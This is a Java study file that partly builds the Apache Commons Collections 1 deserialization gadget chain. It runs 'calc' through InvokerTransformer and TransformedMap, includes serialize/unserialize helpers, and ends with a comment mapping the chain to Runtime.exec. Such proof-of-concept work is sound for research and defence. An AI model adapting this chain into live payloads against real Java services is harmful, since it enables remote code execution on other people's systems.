package Seri.CCGadgets;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.util.HashMap;
import java.util.Map;


import org.apache.commons.collections.map.TransformedMap;


public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer itf = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        );
        HashMap<Object ,Object> hashmap = new HashMap<Object ,Object>();
        hashmap.put("xxxxx" ,"xxxxxxxxx");
        System.out.println(hashmap);
        Map<Object ,Object> transfromedmap = TransformedMap.decorate(hashmap, null, itf);
        for (Map.Entry entry : transfromedmap.entrySet()){
            entry.setValue(runtime);
        }


    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    }

    /*
    * Gadget chain:
    ObjectInputStream.readObject()
      AnnotationInvocationHandler.readObject()
        Map(Proxy).entrySet()
          AnnotationInvocationHandler.invoke()
            LazyMap.get()
              ChainedTransformer.transform()
                ConstantTransformer.transform()
                InvokerTransformer.transform()
                  Method.invoke()
                    Class.getMethod()
                InvokerTransformer.transform()
                  Method.invoke()
                    Runtime.getRuntime()
                InvokerTransformer.transform()
                  Method.invoke()
                    Runtime.exec()
      */